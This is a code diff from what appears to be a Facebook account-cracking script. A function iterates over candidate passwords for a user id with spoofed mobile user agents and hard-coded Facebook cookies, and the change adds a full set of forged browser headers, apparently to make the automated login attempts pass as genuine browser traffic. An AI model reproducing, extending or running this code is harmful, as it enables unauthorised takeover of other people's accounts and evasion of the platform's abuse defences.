@@ -1847,7 +1847,20 @@ def d(uid,pwx,tl):
         for pw in pwx:
             ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
+            head = {"authority": "m.prod.facebook.com",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "dpr": "3",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "none",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
+            "viewport-width": "980"}
+            free_fb = Session.get('https://m.facebook.com/',headers=head).text
             cookies = {
             'datr': 'OpqVaPyImvfQapu_w36Tb6w9',
             'sb': 'OpqVaFnrZ4qPlR6kiDeA96JW',
